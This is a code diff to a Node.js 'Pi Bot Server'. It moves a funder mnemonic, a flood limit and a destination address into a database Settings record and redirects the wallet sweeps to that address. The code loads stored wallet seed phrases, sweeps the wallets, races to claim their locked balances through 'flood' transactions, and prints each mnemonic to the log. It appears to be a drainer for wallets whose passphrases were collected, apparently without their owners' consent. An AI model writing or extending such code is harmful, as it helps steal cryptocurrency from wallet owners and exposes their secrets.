@@ -7,6 +7,7 @@ import sponsorRoutes from './routes/sponsors.js';
 import { arrayBatches, autoCheckSponsorForClaimable, autoClaimUnlocked, autoDuplicatePassphrase, autoFundWallet, autoSweepWallet, buildAndSubmitMultiSigTx, FloodchannelTransaction, fundWallet, getAccount, getBalance, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, sleep, sweepWallet } from './utils/fn.js';
 import Passphrase from './models/Passphrase.js';
 import Sponsors from './models/Sponsors.js';
+import Settings from './models/Settings.js';
 dotenv.config();
 
 const app = express();
@@ -44,6 +45,10 @@ app.use((req, res, next) => {
 });
 
 await connectToDB();
+const settings = await Settings.findOne();
+const MAX_FLOOD_COUNT = Number(settings.maxFlood);
+const BOT_PHRASE = settings.funderMnemonic;
+const MAIN_ADDRESS = settings.mainAddress;
 
 app.use('/api/passphrases', passphraseRoutes);
 app.use('/api/sponsors', sponsorRoutes);
@@ -53,8 +58,7 @@ app.get('/', (req, res) => {
   res.send('🔁 Pi Bot Server is running - Time: ' + new Date().toLocaleString());
 });
 
-const BOT_PHRASE = '';
-const MAX_FLOOD_COUNT = 4;
+
 const instanceId = process.env.INSTANCE_ID || 0;
 const sponsors = await Sponsors.find({ name: 'shepherd' });
 const chunkSize = Math.ceil(sponsors.length/2);
@@ -91,7 +95,7 @@ setInterval(async() => {
                 const result = await FloodchannelTransaction(
                     p.mnemonic,
                     p.balanceId,
-                    PI_PUBLIC_ADDRESS,
+                    MAIN_ADDRESS,
                     p.amount,
                     sponsorChunk
                 );
@@ -206,7 +210,7 @@ setInterval(async() => {
         const upcomingClaimables = await getUpcomingClaimables();
         if (upcomingClaimables.length > 0) {
             for(const claimable of upcomingClaimables) {
-                await sweepWallet(claimable.mnemonic, PI_PUBLIC_ADDRESS);
+                await sweepWallet(claimable.mnemonic, MAIN_ADDRESS);
                 await sleep(1000);
             }
             global.isSweeping = false;
@@ -219,7 +223,7 @@ setInterval(async() => {
         for(const passphrases of passphraseBatches) {
             await Promise.all(passphrases.map(async (phrase, i) => {
                 try {
-                    const result = await sweepWallet(phrase.mnemonic, PI_PUBLIC_ADDRESS);
+                    const result = await sweepWallet(phrase.mnemonic, MAIN_ADDRESS);
                     console.log('Phrase', phrase.mnemonic)
                 } catch (e) {
                     if (e.response && e.response.data && e.response.data.extras) {
